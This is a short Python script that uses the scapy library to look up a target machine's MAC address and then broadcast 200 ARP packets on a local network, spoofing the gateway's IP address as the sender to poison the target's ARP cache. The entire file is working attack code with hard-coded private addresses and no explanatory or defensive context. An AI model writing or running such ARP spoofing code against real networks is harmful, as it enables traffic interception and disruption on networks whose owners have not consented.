from scapy.all import sendp, ARP, Ether, getmacbyip

# Get target MAC first
target_mac = getmacbyip("192.168.100.3")
print(f"Target MAC: {target_mac}")

def arp_flood(target_ip, gateway_ip, count=200):
    pkt = (
        Ether(dst="ff:ff:ff:ff:ff:ff", type=0x0806) /
        ARP(op=1,
            pdst=target_ip,
            psrc=gateway_ip,
            hwdst="00:00:00:00:00:00")
    )
    for i in range(count):
        sendp(pkt, iface="eth0", verbose=False)

arp_flood("192.168.100.3", "192.168.100.5")
